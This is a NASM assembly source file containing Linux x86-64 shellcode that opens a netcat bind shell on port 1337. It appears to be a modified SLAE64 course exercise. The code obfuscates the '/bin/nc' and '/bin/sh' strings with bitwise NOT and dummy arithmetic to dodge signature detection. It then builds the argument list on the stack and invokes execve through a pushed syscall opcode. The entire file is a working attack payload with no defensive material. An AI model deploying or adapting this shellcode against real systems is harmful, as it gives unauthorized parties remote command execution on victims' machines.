; { Title: Shellcode linux/x86-64 bind-shell with netcat }

; Author    : Gaussillusion
; Len       : 131 bytes
; Language  : Nasm
; modified by Christophe GOY , SLAE64-1337


global _start:

_start:

	xor r14 , r14
	add r14 , 0x36
	mov eax , eax
	sub eax , eax
	mov rdx , rax
	push rdx
	mov rbx , 0x9c91d0d091969dd0     ; "/bin/nc" , "noted"
	not rbx
	push rbx
	push rsp
        pop rdi

	mov	rcx,0x978cd091969dd033    ; "/bin/sh" "noted" , followed by dummy substraction operation ("33") dummy bytes
        sub cl , 33
	not 	rcx
	shr	rcx,0x08     ;
        push 	rcx
	push rsp
        pop rcx

	push dx
	add ax , 0x1df
	imul rax , r14
	add ax , 0x23        ; after mul , add -> ax = "-e" in reverse order
	push word ax
	push rsp
        pop rbx

	push dx                ; null terminate string
	push dword 0x37333331 ; "1337"
	push rsp
        pop r13

	push dx                ; null terminate string
	push word 0x702d                ; "-p"
	push rsp
        pop r12


	push dx                ; null terminate string
	push word 0x6c2d              ;  "-l"
	push rsp
        pop r11

	xor r9 , r9
        mov r9w ,  0x050f   ; opcode for syscall in reverse order

	push	rdx  ;push NULL
	push 	rcx  ;push address of 'bin/sh'
	push    rbx  ;push address of '-e'
	push    r13  ;push address of '1337'
	push    r12   ;push address of '-p'
	push	r11   ;push address of '-l'
	push 	rdi  ;push address of '/bin/nc'

	push rsp
        pop rsi
	xor    rax , rax
	add al , 59
        push r9
        push rsp
	pop r9
        call r9    ;  syscall
